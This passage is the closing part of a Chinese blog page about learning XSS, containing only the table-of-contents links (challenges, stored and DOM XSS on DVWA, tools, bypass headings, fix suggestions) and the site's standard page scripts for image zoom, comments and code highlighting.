class="toc-nav-number">5.1.5.</span> <span class="toc-nav-text">挑战五</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%85%AD"><span class="toc-nav-number">5.1.6.</span> <span class="toc-nav-text">挑战六</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%B8%83"><span class="toc-nav-number">5.1.7.</span> <span class="toc-nav-text">挑战七</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%85%AB"><span class="toc-nav-number">5.1.8.</span> <span class="toc-nav-text">挑战八</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%B9%9D"><span class="toc-nav-number">5.1.9.</span> <span class="toc-nav-text">挑战九</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81"><span class="toc-nav-number">5.1.10.</span> <span class="toc-nav-text">挑战十</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E4%B8%80"><span class="toc-nav-number">5.1.11.</span> <span class="toc-nav-text">挑战十一</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E4%BA%8C"><span class="toc-nav-number">5.1.12.</span> <span class="toc-nav-text">挑战十二</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E4%B8%89"><span class="toc-nav-number">5.1.13.</span> <span class="toc-nav-text">挑战十三</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E5%9B%9B"><span class="toc-nav-number">5.1.14.</span> <span class="toc-nav-text">挑战十四</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E4%BA%94"><span class="toc-nav-number">5.1.15.</span> <span class="toc-nav-text">挑战十五</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E5%85%AD"><span class="toc-nav-number">5.1.16.</span> <span class="toc-nav-text">挑战十六</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E4%B8%83"><span class="toc-nav-number">5.1.17.</span> <span class="toc-nav-text">挑战十七</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E5%85%AB"><span class="toc-nav-number">5.1.18.</span> <span class="toc-nav-text">挑战十八</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%8D%81%E4%B9%9D"><span class="toc-nav-number">5.1.19.</span> <span class="toc-nav-text">挑战十九</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%BA%8C%E5%8D%81"><span class="toc-nav-number">5.1.20.</span> <span class="toc-nav-text">挑战二十</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-1"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">存储型</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%90%AD%E5%BB%BA%E6%8E%A5%E6%94%B6%E5%B9%B3%E5%8F%B0"><span class="toc-nav-number">5.2.1.</span> <span class="toc-nav-text">搭建接收平台</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-nav-number">5.2.2.</span> <span class="toc-nav-text">实战</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#DVWA-low"><span class="toc-nav-number">5.2.2.1.</span> <span class="toc-nav-text">DVWA-low</span></a></li><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#DVWA-Medium"><span class="toc-nav-number">5.2.2.2.</span> <span class="toc-nav-text">DVWA-Medium</span></a></li><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#DVWA-high"><span class="toc-nav-number">5.2.2.3.</span> <span class="toc-nav-text">DVWA-high</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#DOM%E5%9E%8B-2"><span class="toc-nav-number">5.3.</span> <span class="toc-nav-text">DOM型</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#DVWA-low-1"><span class="toc-nav-number">5.3.1.</span> <span class="toc-nav-text">DVWA-low</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#DVWA-Medium-1"><span class="toc-nav-number">5.3.2.</span> <span class="toc-nav-text">DVWA-Medium</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#DVWA-High"><span class="toc-nav-number">5.3.3.</span> <span class="toc-nav-text">DVWA-High</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Tools"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">Tools</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">黑盒测试</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#AWVS"><span class="toc-nav-number">6.1.1.</span> <span class="toc-nav-text">AWVS</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#BruteXSS"><span class="toc-nav-number">6.1.2.</span> <span class="toc-nav-text">BruteXSS</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#BeEF"><span class="toc-nav-number">6.1.3.</span> <span class="toc-nav-text">BeEF</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">白盒测试</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Bypass"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">Bypass</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">大小写</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BC%96%E7%A0%81"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">编码</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#magic-quotes-gpc"><span class="toc-nav-number">7.3.</span> <span class="toc-nav-text">magic_quotes_gpc</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-nav-number">7.4.</span> <span class="toc-nav-text">标签</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E9%97%AD%E5%90%88"><span class="toc-nav-number">7.4.1.</span> <span class="toc-nav-text">闭合</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%85%B6%E5%AE%83%E6%A0%87%E7%AD%BE"><span class="toc-nav-number">7.4.2.</span> <span class="toc-nav-text">其它标签</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9B%BF%E6%8D%A2"><span class="toc-nav-number">7.5.</span> <span class="toc-nav-text">替换</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%87%8D%E5%A4%8D%E7%BB%95%E8%BF%87"><span class="toc-nav-number">7.6.</span> <span class="toc-nav-text">重复绕过</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%AE%BD%E5%AD%90%E8%8A%82%E7%BB%95%E8%BF%87"><span class="toc-nav-number">7.7.</span> <span class="toc-nav-text">宽子节绕过</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BA%8B%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="toc-nav-number">7.8.</span> <span class="toc-nav-text">事件属性</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-nav-number">7.9.</span> <span class="toc-nav-text">长度限制</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#PHP%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0"><span class="toc-nav-number">7.10.</span> <span class="toc-nav-text">PHP部分函数</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">修复建议</span></a></li></ol>
    
  </div>
</aside>

  
  <!-- Catalog END -->
</main>

<script>
  (function () {
    var url = 'http://example.com/2020/09/05/XSS学习/';
    var banner = ''
    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
      $('#article-banner').css({
        'background-image': 'url(' + banner + ')'
      })
    } else {
      $('#article-banner').geopattern(url)
    }
    $('.header').removeClass('fixed-header')

    // error image
    $(".markdown-content img").on('error', function() {
      $(this).attr('src', 'http://www.si1ent.xyz/css/images/logo.png')
      $(this).css({
        'cursor': 'default'
      })
    })

    // zoom image
    $(".markdown-content img").on('click', function() {
      var src = $(this).attr('src')
      if (src !== 'http://www.si1ent.xyz/css/images/logo.png') {
        var imageW = $(this).width()
        var imageH = $(this).height()

        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
        zoom = zoom < 1 ? 1 : zoom
        zoom = zoom > 2 ? 2 : zoom
        var transY = (($(window).height() - imageH) / 2).toFixed(2)

        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
        $('.image-view-wrap').addClass('wrap-active')
        $('.image-view-wrap img').css({
          'width': `${imageW}`,
          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
        })
        $('html').css('overflow', 'hidden')

        $('.image-view-wrap').on('click', function() {
          $(this).remove()
          $('html').attr('style', '')
        })
      }
    })
  })();
</script>


  <script>
    var qr = new QRious({
      element: document.getElementById('share-qrcode'),
      value: document.location.href
    });
  </script>



  <script>
    var gitmentConfig = "si1ent";
    if (gitmentConfig !== 'undefined') {
      var gitment = new Gitment({
        id: "XSS学习",
        owner: "si1ent",
        repo: "",
        oauth: {
          client_id: "",
          client_secret: ""
        },
        theme: {
          render(state, instance) {
            const container = document.createElement('div')
            container.lang = "en-US"
            container.className = 'gitment-container gitment-root-container'
            container.appendChild(instance.renderHeader(state, instance))
            container.appendChild(instance.renderEditor(state, instance))
            container.appendChild(instance.renderComments(state, instance))
            container.appendChild(instance.renderFooter(state, instance))
            return container;
          }
        }
      })
      gitment.render(document.getElementById('comments'))
    }
  </script>




    <div class="scroll-top">
  <span class="arrow-icon"></span>
</div>
    <footer class="app-footer">
  <p class="copyright">
    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
    <br>
    </p>
    <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.J_9220772140.115.26b47b3dkZ3BnL#/Integrated/index"><p class="copyright">
    皖ICP备19004273号-1
  </p>
    </a>
</footer>
<script>
  function async(u, c) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
</script>
<script>
  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
    FastClick.attach(document.body);
  })
</script>

<script>
  var hasLine = 'true';
  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
    $('figure pre').each(function(i, block) {
      var figure = $(this).parents('figure');
      if (hasLine === 'false') {
        figure.find('.gutter').hide();
      }
      var lang = figure.attr('class').split(' ')[1] || 'code';
      var codeHtml = $(this).html();
      var codeTag = document.createElement('code');
      codeTag.className = lang;
      codeTag.innerHTML = codeHtml;
      $(this).attr('class', '').empty().html(codeTag);
      figure.attr('data-lang', lang.toUpperCase());
      hljs.highlightBlock(block);
    });
  })
</script>
<!-- Baidu Tongji -->


<script src="/js/script.js"></script>


  </body>
</html>